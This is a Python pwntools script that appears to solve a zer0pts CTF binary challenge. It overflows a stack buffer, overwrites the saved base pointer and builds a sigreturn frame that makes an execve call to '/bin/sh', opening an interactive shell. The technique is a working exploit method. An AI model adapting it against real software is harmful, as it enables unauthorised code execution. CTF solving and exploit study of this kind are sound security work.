#!/usr/bin/python3
from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
# fsb(width, offset, data, padding, roop)
# sop()
# fake_file()

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
#"""
HOST = "pwn.ctf.zer0pts.com"
PORT = 9011 
"""
HOST = "localhost"
PORT = 7777
#"""

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

addr_stk_dpt = 0x60022e
addr_stk_shadow = 0x600234
addr_read = 0x4001ea
addr_syscall = 0x4001ec

def exploit():
	sop = SOP() 							# defined in my python library
	sop.rax = 59
	sop.rdi = addr_stk_shadow+0x14 			# address of "/bin/sh\x00"
	sop.rsi = 0
	sop.rdx = 0
	sop.rip = addr_syscall

	payload = b"A"*0x100
	payload += p64(addr_stk_dpt-0x1e+0x100) # overwrite old_rbp
	payload += sop.get_payload()			# sigreturn frame from my library

	conn.sendlineafter("Data: ", payload)
	
	payload = b"A"*0x1e
	payload += b"\x02\x00" 					# __stack_depth
	payload += p32(0)
	payload += p64(addr_syscall)			# addr_stk_shadow
	payload += p64(addr_read)				 
	payload += b"\x00"*0x4
	payload += b"/bin/sh\x00"
	conn.sendlineafter("Data: ", payload)
	payload = b"A"*14 						# payload length = 15 -> syscall number of signreturn
	conn.sendline(payload)  				 
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
